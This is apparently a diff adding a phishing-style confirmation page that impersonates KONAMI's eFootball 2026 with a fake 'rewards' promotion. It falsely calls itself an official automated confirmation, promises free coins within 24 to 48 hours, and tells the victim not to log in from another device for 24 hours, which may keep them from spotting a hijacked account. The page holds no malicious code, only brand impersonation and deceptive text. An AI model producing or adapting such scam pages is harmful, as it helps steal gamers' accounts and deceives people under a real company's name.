@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Success - eFootball™ 2026 Rewards</title>
+    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@700;900&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --efb-navy: #001233;
+            --efb-yellow: #e6ff00;
+            --efb-pink: #ff0055;
+            --success-green: #00e676;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            background-color: var(--efb-navy);
+            color: #fff;
+            font-family: 'Roboto', sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* Header */
+        .konami-top {
+            width: 100%;
+            background-color: #B80211;
+            padding: 8px 15px;
+            border-bottom: 2px solid var(--efb-pink);
+        }
+        .konami-top img { height: 20px; }
+
+        /* Success Icon Section */
+        .success-box {
+            margin-top: 40px;
+            text-align: center;
+            padding: 20px;
+            animation: fadeIn 1s ease-in;
+        }
+
+        .check-circle {
+            width: 80px;
+            height: 80px;
+            background: var(--success-green);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 50px;
+            margin: 0 auto 20px;
+            box-shadow: 0 0 20px var(--success-green);
+        }
+
+        .congrats-text {
+            font-family: 'Kanit', sans-serif;
+            font-size: 28px;
+            color: var(--efb-yellow);
+            text-transform: uppercase;
+            font-style: italic;
+        }
+
+        /* Info Card */
+        .status-card {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--efb-yellow);
+            border-radius: 12px;
+            width: 90%;
+            max-width: 450px;
+            padding: 20px;
+            margin: 25px 0;
+        }
+
+        .status-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .status-row:last-child { border: none; }
+        .label { color: #aaa; font-size: 14px; }
+        .value { font-weight: bold; color: var(--efb-yellow); }
+
+        /* Company Details */
+        .company-info {
+            width: 90%;
+            max-width: 450px;
+            background: #002266;
+            padding: 20px;
+            border-radius: 8px;
+            font-size: 13px;
+            line-height: 1.6;
+            color: #ddd;
+        }
+
+        .company-info h3 {
+            color: var(--efb-pink);
+            margin-bottom: 10px;
+            font-family: 'Kanit', sans-serif;
+            font-size: 16px;
+        }
+
+        /* Buttons */
+        .btn-done {
+            width: 90%;
+            max-width: 450px;
+            background: var(--efb-yellow);
+            color: #000;
+            border: none;
+            padding: 15px;
+            font-size: 18px;
+            font-weight: 900;
+            font-family: 'Kanit', sans-serif;
+            margin: 30px 0;
+            border-radius: 5px;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+
+        footer {
+            margin-top: auto;
+            padding: 20px;
+            font-size: 10px;
+            color: #666;
+            text-align: center;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="konami-top">
+        <img src="https://i.ibb.co/zWnS4SRr/eef84893eafec0adb3acd3b8c8f3b794.jpg" alt="KONAMI">
+    </div>
+
+    <div class="success-box">
+        <div class="check-circle">✓</div>
+        <h1 class="congrats-text">CONGRATULATIONS!</h1>
+        <p style="margin-top: 10px; color: #eee;">Application successfully submitted.</p>
+    </div>
+
+    <div class="status-card">
+        <div class="status-row">
+            <span class="label">Status:</span>
+            <span class="value">Processing...</span>
+        </div>
+        <div class="status-row">
+            <span class="label">Reward:</span>
+            <span class="value" id="reward-val">eFootball™ Coins</span>
+        </div>
+        <div class="status-row">
+            <span class="label">ETA:</span>
+            <span class="value">24 - 48 Hours</span>
+        </div>
+    </div>
+
+    <div class="company-info">
+        <h3>Official Verification Notice</h3>
+        <p>This reward is part of the <strong>KONAMI 30th Anniversary</strong> promotion. All rewards are subject to security checks by the eFootball™ 2026 anti-fraud system.</p>
+        <br>
+        <p>Please do not log in to your account from another device for the next 24 hours to ensure the coin delivery is not interrupted. You will receive an in-game notification once the transfer is complete.</p>
+    </div>
+
+    <button class="btn-done" onclick="location.href='https://www.konami.com/efootball/'">Return to Official Page</button>
+
+    <footer>
+        &copy; 2026 KONAMI Digital Entertainment. <br>
+        This is an official automated confirmation. <br>
+        eFootball™, MyClub, and KONAMI are trademarks of Konami Digital Entertainment Co., Ltd.
+    </footer>
+
+    <script>
+        // Waxaan ka dhigaynaa mid dynamic ah si uu u muujiyo inay wax socdaan
+        setTimeout(() => {
+            console.log("Reward process initiated for user.");
+        }, 1000);
+    </script>
+</body>
+</html>
